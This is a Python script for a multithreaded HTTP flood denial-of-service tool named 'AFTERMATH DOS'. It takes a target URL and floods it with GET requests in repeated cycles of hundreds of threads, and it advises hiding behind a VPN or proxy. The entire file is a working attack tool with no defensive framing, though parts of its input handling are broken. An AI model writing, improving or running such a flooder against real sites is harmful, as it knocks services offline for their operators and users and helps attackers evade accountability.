# AFTERMATH DOS - URL VERSION
import requests
from colorama import Fore, init
import threading
import time
init()
print(Fore.LIGHTGREEN_EX + "Welcome to AFTERMATH DOS")
print(Fore.LIGHTYELLOW_EX + "Please use VPN or PROXY to protect your IP!")
print(Fore.LIGHTRED_EX + "Input URL:")
url = input(Fore.MAGENTA + ">>> ")
print(Fore.LIGHTRED_EX + "Threads count(default:256):")
threads = input(Fore.YELLOW + ">>> ")
print(Fore.LIGHTRED_EX + "Cycles count(default:20):")
cycles = input(Fore.YELLOW + ">>> ")


def Menu(thread=threads, cycle=cycles):
    if thread == "":
        thread = 0
        threads1 = thread + 256
    else:
        threads1 = thread

    if cycle == "":
        cycle = 0
        cycle1 = cycle + 20
    else:
        cycle1 = cycle

    if url == "":
        Menu()
    else:
        threading_start(thread=int(threads1), cycles=cycle1)


def threading_start(thread, cycles):
    print(Fore.LIGHTRED_EX + "          STARTING ATTACK")
    print(Fore.LIGHTRED_EX + "=====================================")
    x = 0
    while x <= cycles:
        for i in range(thread):
            th = threading.Thread(target=req)
            th.start()
            th.join(0.05)
        x += 1
        print(Fore.LIGHTRED_EX + "=====================================")
        print(Fore.LIGHTYELLOW_EX + "[" + str(x) +"]" +"Cycle completed!")
        print(Fore.LIGHTRED_EX + "=====================================")
        time.sleep(0.7)


def req():
    r = requests.get(url)
    packet_stat = r.status_code
    if packet_stat == 200:
        print(Fore.LIGHTGREEN_EX + "[200]" + "Request sent on: " + url)
    else:
        print(Fore.LIGHTRED_EX + "UNKNOWN ERROR!")
Menu()
